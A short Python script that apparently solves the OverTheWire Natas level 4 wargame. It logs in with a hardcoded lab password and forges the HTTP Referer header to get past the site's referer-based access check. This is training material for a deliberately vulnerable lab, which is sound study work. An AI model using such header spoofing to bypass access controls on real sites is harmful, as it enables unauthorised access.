#! /usr/bin/python3

import requests
import re

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = f"http://{username}.natas.labs.overthewire.org"

response = requests.get(url, auth = (username, password),
        headers = {"referer": "http://natas5.natas.labs.overthewire.org/"})

content = response.text

print(content)
